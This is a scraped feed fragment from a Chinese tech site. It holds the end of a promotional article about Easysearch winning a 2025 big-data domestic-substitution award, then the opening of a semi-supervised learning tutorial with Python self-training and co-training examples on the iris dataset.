blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>近日于上海明捷万丽酒店成功举办的 “<strong>2025 第八届金猿大数据产业发展论坛 — 暨 AI Infra &amp; Data Agent 趋势论坛</strong>” 大会上，<strong>极限数据（北京）科技有限公司（以下简称“极限科技”）</strong> 凭借其在分布式搜索型数据库领域的技术突破与卓越的国产化实践，成功入选《<strong>2025 中国大数据产业「年度国产化优秀代表厂商」</strong>》榜单，并获颁这一行业重磅奖项。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/22a64040821c46d986272af278c3a58d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p6B6ZmQ5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769529027&amp;x-signature=qa4TrINjxBYZKUeMlAwprC4slbo%3D" alt="" loading="lazy"/></p>
<p>本届论坛由金猿组委会、数据猿、上海市数商协会及上海大数据联盟联合主办，以“<strong>数据有猿·智见十年</strong>”为主题，吸引了近千家企业参与申报。经过严格的初审、公审与终审交叉验证机制，极限科技最终从众多竞争者中脱颖而出，荣登榜单。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e834ea43b3fc48ed8c511ff98545f4d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p6B6ZmQ5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769529027&amp;x-signature=uU%2F2YDxQ%2FETkfbGI6hqpFWd8igY%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">深耕核心搜索技术，填补国产化空白</h2>
<p>极限科技成立于 2021 年 12 月，是一家专注于大数据搜索与分析的基础软件公司。公司总部位于北京，在长沙设立研发中心，并在上海、广州设立办事处或服务中心。其核心团队均来自 Elasticsearch 原厂及中文社区，拥有多年 ES 源码开发经验，致力于“让搜索更简单”，打造极致易用的数据探索与分析体验。</p>
<p>公司自主研发的核心产品 Easysearch 搜索型数据库，是我国在分布式搜索型数据库领域实现关键国产化替代的代表性成果。该产品精准填补了国内在轻量化、高性能、自主可控搜索引擎方面的市场空白。</p>
<h2 data-id="heading-1">产品性能卓越，实现无缝迁移与超越</h2>
<p>Easysearch 支持结构化与非结构化数据检索、全文检索、向量检索、空间地理位置信息检索、多模态混合检索、组合查询、多语种支持、语义分析、聚合分析等多种核心功能。测试表明，其性能已达到甚至优于国外领先产品。</p>
<p>在产品能力上，Easysearch 不仅完全兼容 Elasticsearch 的生态接口，保障了用户业务的无缝平滑迁移，更在性能优化、存储效率、企业级安全及原生中文处理等方面实现了显著超越。其内置的 Web 管理控制台、全面的数据加密与权限管控功能，提供了开箱即用的企业级体验。</p>
<h2 data-id="heading-2">构建完整信创生态</h2>
<p>尤为关键的是，Easysearch 率先完成了与国产主流 CPU（如鲲鹏、飞腾、海光、龙芯、申威、兆芯等）和操作系统（如统信 UOS、银河麒麟、开源欧拉等）的深度适配与互认证，构建了完整的信创技术栈支持能力，彻底解决了国外产品在国产化环境下兼容性差、维护困难、更新受限等长期存在的痛点。</p>
<p>在核心技术国产化意义上，Easysearch 通过完全自主可控的分布式搜索技术体系，突破了关键基础软件依赖国外企业的局面，满足了政府、金融、能源、运营商等行业对“可控、安全、可替代”的战略需求。同时，其向量搜索和 AI 检索能力填补了国内在智能搜索与大模型结合领域的技术缺口。</p>
<h2 data-id="heading-3">获权威资质认可，落地众多头部客户</h2>
<p>极限科技及 Easysearch 已获得多项权威资质认证，包括国家高新技术企业、ISO 三大管理体系认证，并荣获 2023 年星河案例数据库标杆案例。产品亦通过了信通院基础能力专项测评及中国泰尔实验室检验测试。</p>
<p>目前，Easysearch 已在金融、运营商、制造、政企等多领域实现规模化落地，服务客户包括移动云、中国一汽、中国人保、东莞证券、航天信息等头部企业，累计下载部署量已超过 500 万次。其中，公司开发的中文分词器（IK、Pinyin）、压测工具（Loadgen）、数据迁移工具（ESM）已被 85% 的中国 Elasticsearch 用户部署在生产环境中。</p>
<h2 data-id="heading-4">荣获行业大奖，彰显标杆价值</h2>
<p>此次荣获 “年度国产化优秀代表厂商” 奖项，不仅是行业对极限科技技术实力与国产化贡献的高度认可，更彰显了公司在推动大数据产业自主创新进程中的标杆作用。</p>
<p>极限科技创始人表示：</p>
<blockquote>
<p>“我们坚信‘追求极致，无限可能’。获得这份荣誉，是对我们团队多年来坚持自主创新、深耕搜索技术的最好鼓励。未来，极限科技将持续加大研发投入，以技术创新驱动产业升级，为各行业客户提供更高效、更安全、更智能的数据探索与分析能力，助力中国大数据产业在智能时代实现高质量、自主可控的发展。”</p>
</blockquote>
<hr/>
<p>相关链接：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F0aMKBWhE1cJ2toAMkUwGYw" target="_blank" title="https://mp.weixin.qq.com/s/0aMKBWhE1cJ2toAMkUwGYw" ref="nofollow noopener noreferrer">《2025 中国大数据产业年度「国产化优秀代表厂商」》榜单/奖项</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F_77xDmEvPMli_fZh0YsYCA" target="_blank" title="https://mp.weixin.qq.com/s/_77xDmEvPMli_fZh0YsYCA" ref="nofollow noopener noreferrer">【金猿国产化展】Easysearch —— 一个自主可控、安全可靠的企业级搜索解决方案</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[万字长文！搞懂机器学习中半监督学习的经典方法！]]></title>    <link>https://juejin.cn/post/7597258378590830602</link>    <guid>https://juejin.cn/post/7597258378590830602</guid>    <pubDate>2026-01-20T15:53:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597258378590830602" data-draft-id="7597251197426466842" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="万字长文！搞懂机器学习中半监督学习的经典方法！"/> <meta itemprop="keywords" content="面试,算法"/> <meta itemprop="datePublished" content="2026-01-20T15:53:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="aicoting"/> <meta itemprop="url" content="https://juejin.cn/user/933911964427818"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            万字长文！搞懂机器学习中半监督学习的经典方法！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/933911964427818/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    aicoting
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T15:53:17.000Z" title="Tue Jan 20 2026 15:53:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>推荐直接网站在线阅读：<a href="https://link.juejin.cn?target=https%3A%2F%2Faicoting.cn%2F" target="_blank" title="https://aicoting.cn/" ref="nofollow noopener noreferrer">aicoting.cn</a></p>
</blockquote>
<p>半监督学习（Semi-Supervised Learning）是一类介于监督学习和无监督学习之间的方法，旨在利用少量带标签的数据与大量无标签的数据共同训练模型。在现实任务中，标注数据通常获取成本高，而无标签数据丰富，比如要进行物体检测，那么就要人工用一个方框把不同的物体标注出来，而且不同的类别标注也要不同，我在大三的时候就干过，从那之后再也不想标注了，这个是耗费时间和精力巨大的一个工作。</p>
<p>半监督学习通过挖掘数据分布结构与标签信息之间的关联，提高模型的泛化能力。其主要技术包括自训练、协同训练、基于图的标签传播、半监督支持向量机以及与深度学习结合的生成式与一致性正则化方法，广泛应用于文本分类、图像识别、医疗分析等场景。</p>
<h2 data-id="heading-0">自训练</h2>
<p>自训练（Self-training）是半监督学习中最经典、最直观的方法之一。它通过利用少量带标签数据训练一个初始模型，再借助该模型对未标注数据进行预测，将高置信度的预测结果作为伪标签（pseudo labels），逐步扩充训练集，从而提升模型性能。自训练的核心思想是 模型自己教自己，不断利用无标签数据中潜在的信息来改进预测能力。</p>
<p>自训练的一般过程可以概括为以下几个步骤：</p>
<ol>
<li>初始训练：使用少量标注数据训练一个监督学习模型。</li>
<li>伪标签生成：用该模型预测未标注数据，并计算每个样本的置信度。</li>
<li>样本筛选：选择置信度较高的预测样本，赋予其伪标签。</li>
<li>数据扩充：将这些伪标签样本加入训练集，形成新的“标注”数据集。</li>
<li>迭代更新：重新训练模型，并重复上述步骤，直到性能收敛或达到预设迭代次数。</li>
</ol>
<p>以逻辑回归（Logistic Regression）为例，可以先用少量带标签样本训练一个模型，然后利用该模型预测未标注样本的类别，并选择置信度超过阈值的样本作为伪标签，逐步加入训练集，迭代更新模型。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
<span class="hljs-keyword">from</span> sklearn.datasets <span class="hljs-keyword">import</span> load_iris
<span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> LogisticRegression
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np

<span class="hljs-comment"># 1. 加载数据，只取前两个特征便于二维可视化</span>
X, y = load_iris(return_X_y=<span class="hljs-literal">True</span>)
X = X[:, :<span class="hljs-number">2</span>]

n_labeled = <span class="hljs-number">30</span>
X_labeled, y_labeled = X[:n_labeled], y[:n_labeled]
X_unlabeled = X[n_labeled:]

<span class="hljs-comment"># 2. 初始训练</span>
model = LogisticRegression(max_iter=<span class="hljs-number">200</span>)
model.fit(X_labeled, y_labeled)

<span class="hljs-comment"># 可视化函数：绘制决策边界 + 已标注/伪标签样本</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">plot_step</span>(<span class="hljs-params">X_labeled, y_labeled, X_unlabeled, title</span>):
    h = <span class="hljs-number">.02</span>  <span class="hljs-comment"># 网格步长</span>
    x_min, x_max = X[:, <span class="hljs-number">0</span>].<span class="hljs-built_in">min</span>() - <span class="hljs-number">1</span>, X[:, <span class="hljs-number">0</span>].<span class="hljs-built_in">max</span>() + <span class="hljs-number">1</span>
    y_min, y_max = X[:, <span class="hljs-number">1</span>].<span class="hljs-built_in">min</span>() - <span class="hljs-number">1</span>, X[:, <span class="hljs-number">1</span>].<span class="hljs-built_in">max</span>() + <span class="hljs-number">1</span>
    xx, yy = np.meshgrid(np.arange(x_min, x_max, h),
                         np.arange(y_min, y_max, h))
    
    Z = model.predict(np.c_[xx.ravel(), yy.ravel()])
    Z = Z.reshape(xx.shape)
    
    plt.contourf(xx, yy, Z, alpha=<span class="hljs-number">0.3</span>, cmap=plt.cm.Set1)
    plt.scatter(X_unlabeled[:, <span class="hljs-number">0</span>], X_unlabeled[:, <span class="hljs-number">1</span>], 
                c=<span class="hljs-string">'gray'</span>, marker=<span class="hljs-string">'x'</span>, label=<span class="hljs-string">'Unlabeled'</span>, alpha=<span class="hljs-number">0.5</span>)
    plt.scatter(X_labeled[:, <span class="hljs-number">0</span>], X_labeled[:, <span class="hljs-number">1</span>], 
                c=y_labeled, cmap=plt.cm.Set1, edgecolor=<span class="hljs-string">'k'</span>, label=<span class="hljs-string">'Labeled'</span>)
    plt.title(title)
    plt.legend()
    plt.show()

<span class="hljs-comment"># 3. 自训练循环</span>
<span class="hljs-keyword">for</span> step <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):
    plot_step(X_labeled, y_labeled, X_unlabeled, <span class="hljs-string">f"Iteration <span class="hljs-subst">{step}</span>"</span>)
    
    probs = model.predict_proba(X_unlabeled)
    pseudo_labels = probs.argmax(axis=<span class="hljs-number">1</span>)
    confidences = probs.<span class="hljs-built_in">max</span>(axis=<span class="hljs-number">1</span>)
    mask = confidences &gt; <span class="hljs-number">0.9</span>  <span class="hljs-comment"># 高置信度样本</span>
    
    <span class="hljs-keyword">if</span> mask.<span class="hljs-built_in">sum</span>() == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">break</span>
    
    <span class="hljs-comment"># 将伪标签样本加入训练集</span>
    X_labeled = np.vstack([X_labeled, X_unlabeled[mask]])
    y_labeled = np.concatenate([y_labeled, pseudo_labels[mask]])
    X_unlabeled = X_unlabeled[~mask]
    
    <span class="hljs-comment"># 重新训练</span>
    model.fit(X_labeled, y_labeled)

<span class="hljs-comment"># 最终可视化</span>
plot_step(X_labeled, y_labeled, X_unlabeled, <span class="hljs-string">"Final Model"</span>)
</code></pre>
<p>输出如下，背景颜色表示模型预测的 分类区域；圆点表示已标注/伪标注样本，色表示 未标注样本；</p>
<p>每次迭代会画一张图，可以看到随着伪标签样本加入，决策边界逐渐变化，覆盖更多未标注数据。</p>
<p>初始迭代时，模型仅依赖少量标注样本，分类区域相对狭窄；随着高置信度伪标签被加入训练集，模型能够利用更多信息进行更新，训练样本分布更加丰富，分类边界逐渐调整，覆盖更多未标注样本。最终，模型的决策能力明显增强，未标注样本被较好地划分到正确类别中。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5b37f2dd105542a1affed039a276f1df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWljb3Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769529196&amp;x-signature=gxEdSpyY53eMMyZm6QCaJLs8Pcg%3D" alt="" loading="lazy"/></p>
<p>自训练的优点在于实现简单，几乎可以应用于任何监督学习模型，例如逻辑回归、SVM、神经网络等，而且能够有效利用大量未标注数据，在标注样本稀缺的情况下提升性能。然而，该方法也存在局限性：如果初始模型质量较差或预测出现错误，高置信度的伪标签可能会传播错误，从而降低整体性能。此外，它对数据分布也有一定依赖，类别分布不均衡或边界复杂时容易产生偏差。</p>
<p>为了解决这些问题，研究者提出了多种改进方法，例如动态调整置信度阈值以减少错误传播，使用多个模型互相生成伪标签以降低偏差，或者结合深度学习中的一致性正则化、生成对抗网络等方法，以增强对复杂任务的适应能力。这些改进使得自训练在实际应用中更为稳健和高效。</p>
<p>目前，自训练已经在多个领域得到应用。在文本分类中，它能利用少量人工标注的语料扩展到大规模未标注文本；在图像识别中，尤其是医学影像和遥感等标注成本高的任务中，自训练能够显著减轻标注负担；在语音识别中，它也能借助未标注语音数据提升识别准确率。凭借简单性和灵活性，自训练不仅是半监督学习的重要基石，还常作为更复杂方法的组成部分，在现代机器学习中依然发挥着重要作用。</p>
<h2 data-id="heading-1">协同训练</h2>
<p>协同训练（Co-training）是半监督学习中一种经典且有效的方法，由 Blum 和 Mitchell 在 1998 年提出。与自训练不同，协同训练依赖于数据具有 两种或多种互补的特征视图（views），每个视图都能够单独完成分类任务。</p>
<p>其核心思想是训练两个（或多个）分类器，分别利用不同视图的标注数据进行初始训练，然后让它们互相为对方提供高置信度的未标注样本作为伪标签，从而扩充训练集。通过这种互助式学习，协同训练能够充分利用未标注数据提升模型性能。</p>
<p>协同训练的一般步骤可以概括如下：</p>
<ol>
<li>数据视图划分：将原始特征集划分为两个或多个互补视图，例如文本数据可以分为标题和正文两部分；图像数据可以使用不同特征提取方法生成两个视图。</li>
<li>初始训练：使用少量带标签样本训练每个视图对应的分类器。</li>
<li>互助伪标签：每个分类器在未标注数据上进行预测，并选择置信度较高的样本，将其伪标签提供给另一个分类器。</li>
<li>训练集扩充：将伪标签样本加入训练集，重新训练两个分类器。</li>
<li>迭代更新：重复互助伪标签和训练集扩充的过程，直到模型收敛或达到预设迭代次数。</li>
</ol>
<p>以文本分类为例，假设我们有新闻文章数据，每篇文章包含标题和正文两部分：</p>
<ul>
<li>视图 1（标题）训练分类器 A；视图 2（正文）训练分类器 B。</li>
<li>分类器 A 预测未标注样本的类别，并将高置信度样本提供给 B；B 同样将高置信度样本提供给 A。</li>
<li>每次迭代，两个分类器的训练集不断扩充，利用未标注数据互相改进性能。</li>
</ul>
<p>这种方法的特点是充分利用 多视图之间的互补性，在每个视图上单独训练可能效果一般，但互相辅助后可以显著提升整体性能。</p>
<p>我们使用鸢尾花数据集，把前两个特征和后两个特征分别作为两个视图，用 两个逻辑回归模型 互相生成伪标签，迭代更新训练集。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
<span class="hljs-keyword">from</span> sklearn.datasets <span class="hljs-keyword">import</span> load_iris
<span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> LogisticRegression
<span class="hljs-keyword">from</span> sklearn.decomposition <span class="hljs-keyword">import</span> PCA
<span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split

<span class="hljs-comment"># 1. 数据</span>
X, y = load_iris(return_X_y=<span class="hljs-literal">True</span>)
X_labeled, X_unlabeled, y_labeled, y_unlabeled_true = train_test_split(
    X, y, train_size=<span class="hljs-number">30</span>, stratify=y, random_state=<span class="hljs-number">42</span>
)

<span class="hljs-comment"># 2. PCA 可视化</span>
pca = PCA(n_components=<span class="hljs-number">2</span>)
X_2d = pca.fit_transform(X)
X_labeled_2d = pca.transform(X_labeled)
X_unlabeled_2d = pca.transform(X_unlabeled)

<span class="hljs-comment"># 3. 划分视图</span>
X_labeled_view1 = X_labeled[:, :<span class="hljs-number">2</span>]
X_labeled_view2 = X_labeled[:, <span class="hljs-number">2</span>:]
X_unlabeled_view1 = X_unlabeled[:, :<span class="hljs-number">2</span>]
X_unlabeled_view2 = X_unlabeled[:, <span class="hljs-number">2</span>:]

<span class="hljs-comment"># 4. 分类器</span>
clf1 = LogisticRegression(max_iter=<span class="hljs-number">200</span>)
clf2 = LogisticRegression(max_iter=<span class="hljs-number">200</span>)
clf1.fit(X_labeled_view1, y_labeled)
clf2.fit(X_labeled_view2, y_labeled)

history = [(X_labeled_2d.copy(), y_labeled.copy(), X_unlabeled_2d.copy())]

<span class="hljs-comment"># 5. 协同训练循环</span>
<span class="hljs-keyword">for</span> step <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):
    probs1 = clf1.predict_proba(X_unlabeled_view1)
    pseudo_labels1 = probs1.argmax(axis=<span class="hljs-number">1</span>)
    confidences1 = probs1.<span class="hljs-built_in">max</span>(axis=<span class="hljs-number">1</span>)

    probs2 = clf2.predict_proba(X_unlabeled_view2)
    pseudo_labels2 = probs2.argmax(axis=<span class="hljs-number">1</span>)
    confidences2 = probs2.<span class="hljs-built_in">max</span>(axis=<span class="hljs-number">1</span>)

    <span class="hljs-comment"># 高置信度样本</span>
    mask1 = confidences1 &gt; <span class="hljs-number">0.9</span>
    mask2 = confidences2 &gt; <span class="hljs-number">0.9</span>

    <span class="hljs-comment"># 新增样本：确保不会重复</span>
    new_mask = mask1 | mask2
    <span class="hljs-keyword">if</span> new_mask.<span class="hljs-built_in">sum</span>() == <span class="hljs-number">0</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Step <span class="hljs-subst">{step+<span class="hljs-number">1</span>}</span>: no confident samples, stop."</span>)
        <span class="hljs-keyword">break</span>

    <span class="hljs-comment"># 生成伪标签</span>
    pseudo_labels = np.where(mask1, pseudo_labels1, pseudo_labels2)
    
    <span class="hljs-comment"># 更新训练集</span>
    X_labeled_view1 = np.vstack([X_labeled_view1, X_unlabeled_view1[new_mask]])
    X_labeled_view2 = np.vstack([X_labeled_view2, X_unlabeled_view2[new_mask]])
    X_labeled_2d = np.vstack([X_labeled_2d, X_unlabeled_2d[new_mask]])
    y_labeled = np.concatenate([y_labeled, pseudo_labels[new_mask]])

    <span class="hljs-comment"># 移除已加入的未标注样本</span>
    X_unlabeled_view1 = X_unlabeled_view1[~new_mask]
    X_unlabeled_view2 = X_unlabeled_view2[~new_mask]
    X_unlabeled_2d = X_unlabeled_2d[~new_mask]

    <span class="hljs-comment"># 重新训练</span>
    clf1.fit(X_labeled_view1, y_labeled)
    clf2.fit(X_labeled_view2, y_labeled)

    <span class="hljs-comment"># 保存状态</span>
    history.append((X_labeled_2d.copy(), y_labeled.copy(), X_unlabeled_2d.copy()))

<span class="hljs-comment"># 6. 绘图 2x2 网格</span>
fig, axes = plt.subplots(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, figsize=(<span class="hljs-number">18</span>, <span class="hljs-number">12</span>))
axes = axes.flatten()

<span class="hljs-keyword">for</span> i, (X_l, y_l, X_u) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(history):
    ax = axes[i]
    ax.scatter(X_u[:, <span class="hljs-number">0</span>], X_u[:, <span class="hljs-number">1</span>], c=<span class="hljs-string">'gray'</span>, label=<span class="hljs-string">'Unlabeled'</span>, alpha=<span class="hljs-number">0.5</span>)
    ax.scatter(X_l[:, <span class="hljs-number">0</span>], X_l[:, <span class="hljs-number">1</span>], c=y_l, cmap=<span class="hljs-string">'Set1'</span>, edgecolor=<span class="hljs-string">'k'</span>, label=<span class="hljs-string">'Labeled'</span>)
    ax.set_title(<span class="hljs-string">f"Iteration <span class="hljs-subst">{i}</span>"</span>)
    ax.legend()

<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(history), <span class="hljs-number">4</span>):
    axes[j].axis(<span class="hljs-string">'off'</span>)

plt.tight_layout()
plt.show()
</code></pre>
<p>其中的步骤大概为</p>
<ol>
<li>视图划分：这里把前两个特征作为视图 1，后两个特征作为视图 2。</li>
<li>互助伪标签：每个分类器将高置信度的预测结果加入另一个分类器的训练集。</li>
<li>迭代更新：循环几步，训练集不断扩充，模型性能提升。</li>
<li>高置信度阈值：这里用 0.9，保证加入训练集的伪标签可靠性。</li>
</ol>
<p>运行结果如下，其中显示协同训练能够在少量初始标签的情况下，通过两个不同视图的分类器互相提供高置信度伪标签，逐步将未标注样本加入训练集，使训练集规模不断扩大，彩色点逐渐覆盖灰色未标注样本。</p>
